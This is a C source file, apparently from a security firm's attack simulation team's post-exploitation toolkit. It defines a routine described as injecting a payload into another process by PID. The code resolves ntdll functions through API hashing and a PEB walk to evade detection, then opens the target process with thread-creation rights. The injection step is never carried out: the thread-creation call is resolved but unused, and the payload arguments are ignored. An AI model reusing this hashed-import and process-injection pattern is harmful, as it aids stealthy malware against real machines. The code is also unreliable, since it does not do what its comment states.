/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( RtlExitUserThread );
	D_API( NtCreateThreadEx );
	D_API( NtOpenProcess );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_RTLEXITUSERTHREAD		0x2f6db5e8 /* RtlExitUserThread */
#define H_API_NTCREATETHREADEX		0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_NTOPENPROCESS		0x4b82f718 /* NtOpenProcess */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Injects the target process with the specified 
 * payload.
 *
!*/
D_SEC( A ) DWORD __cdecl Entry( _In_ DWORD Pid, _In_ DWORD Offset, _In_ PVOID Buffer, _In_ DWORD Length )
{
	API			Api;
	CLIENT_ID		Cid;
	OBJECT_ATTRIBUTES	Att;

	UINT16			Mag = 0x4142;
	UINT16			Val = 0x4344;

	HANDLE			Thd = NULL;
	HANDLE			Prc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );

	Api.RtlExitUserThread = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLEXITUSERTHREAD ); 
	Api.NtCreateThreadEx  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX ); 
	Api.NtOpenProcess     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
	Api.NtClose           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Cid.UniqueProcess = C_PTR( Pid );
	InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );

	/* Open up the target process to create threads within. */
	if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, &Att, &Cid ) ) ) {
		if ( ReadRemoteMemory( NtCurrentProcess(), &Mag, &Val, sizeof( Val ) ) ) {
		};
		/* Close Reference! */
		Api.NtClose( Prc );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );

	return Val;
};
